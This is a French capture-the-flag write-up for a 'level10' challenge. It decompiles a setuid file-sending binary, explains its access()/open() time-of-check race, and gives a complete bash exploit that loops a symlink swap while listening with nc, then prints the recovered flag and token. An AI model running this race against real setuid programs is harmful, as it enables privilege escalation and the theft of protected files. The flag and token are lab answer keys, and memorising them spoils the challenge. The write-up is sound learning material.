# [level10]

### Observations

##### Je décompile le programme '~/level10':
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
	int				*v3;
	char			*v4;
	const char		*v6;
	const char		*v7;
	int				v8;
	int				v9;
	size_t			v10;
	char			buf[4096];
	struct sockaddr	addr;
	unsigned int	v13;

	v13 = __readgsdword(0x14u);
	if ( argc <= 2 )
	{
		printf("%s file host\n\tsends file to host if you have access to it\n", *argv);
		exit(1);
	}
	v6 = argv[1];
	v7 = argv[2];
	if ( access(v6, 4) )
		return printf("You don't have access to %s\n", v6);
	printf("Connecting to %s:6969 .. ", v7);
	fflush(stdout);
	v8 = socket(2, 1, 0);
	*(_DWORD *)&addr.sa_data[6] = 0;
	*(_DWORD *)&addr.sa_data[10] = 0;
	addr.sa_family = 2;
	*(_DWORD *)&addr.sa_data[2] = inet_addr(v7);
	*(_WORD *)addr.sa_data = htons(0x1B39u);
	if ( connect(v8, &addr, 0x10u) == -1 )
	{
		printf("Unable to connect to host %s\n", v7);
		exit(1);
	}
	if ( write(v8, ".*( )*.\n", 8u) == -1 )
	{
		printf("Unable to write banner to host %s\n", v7);
		exit(1);
	}
	printf("Connected!\nSending file .. ");
	fflush(stdout);
	v9 = open(v6, 0);
	if ( v9 == -1 )
	{
		puts("Damn. Unable to open file");
		exit(1);
	}
	v10 = read(v9, buf, 0x1000u);
	if ( v10 == -1 )
	{
		v3 = __errno_location();
		v4 = strerror(*v3);
		printf("Unable to read from file: %s\n", v4);
		exit(1);
	}
	write(v8, buf, v10);
	return puts("wrote file!");
}
```

##### Détails du programme:
```bash
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
```

##### Entrées du programme:
```c
char *chemin_fichier
char *addresse_ip
```

##### Fonctionnement:
Le programme vérifie si le chemin_fichier est accessible par l'utilisateur à l'aide de la fonction access. \
Puis se connecte à un serveur avec l'addresse_ip pour par la suite ouvrir le fichier avec la fonction open.

> Le serveur est hébergé sur le port '6969'.

##### Conclusions:
L'ordre d'exécution des fonctions créé une faille qui nous permet de modifier le fichier pointant à la fin du chemin_fichier pendant la connection. \
Cette opération leurre la fonction open sur le fait que nous avons les droits sur ce fichier dû au fait que la fonction access retient les drois d'ouverture.

### Résolution
Je créé un script qui effectue trois opérations distinctes en parallele.

 1. La premiere consiste en une boucle qui créé un lien symbolique vers un fichier accessible par l'utilisateur \
 pour ensuite le modifier vers un fichier innaccessible par l'utilisateur.

 2. La seconde est composée d'une boucle qui exécute le programme '~/level10' tout en pointant sur le lien symbolique \
 créé et modifié par la boucle de l'opération précédente.

 3. La dernière est une simple boucle qui récupère les données circulant sur le port réseau 6969 et affiche le resultat \
 quand ce n'est pas le contenu du fichier accessible (soit le programme).

Il ne me reste plus qu'a lui donner les droits d'exécution et de l'exécuter pour avoir mon flag.

##### /tmp/script.sh :
```bash
#! /bin/bash

rm -rf /tmp/done

link_breaker()
{
	while [ ! -f "/tmp/done" ];
	do
		ln -nsf /home/user/level10/level10 /tmp/link
		ln -nsf /home/user/level10/token /tmp/link
	done
}

listen_to_serv()
{
	while [ ! -f "/tmp/done" ];
	do
		TOK="$(nc -ln 6969)"
		[[ "$TOK" !=  *ELF* ]] && echo "$TOK" && touch /tmp/done
	done
}

exec_loop()
{
	while [ ! -f "/tmp/done" ];
	do
		/home/user/level10/level10 /tmp/link "127.0.0.1" >/dev/null
	done
}

exec_loop&
listen_to_serv&
link_breaker&

wait

```

#### commandes:
```bash
chmod +x /tmp/script.sh
/tmp/script.sh
```

**flag :** woupa2yuojeeaaed06riuj63c

**token :** feulo4b72j7edeahuete3no7c
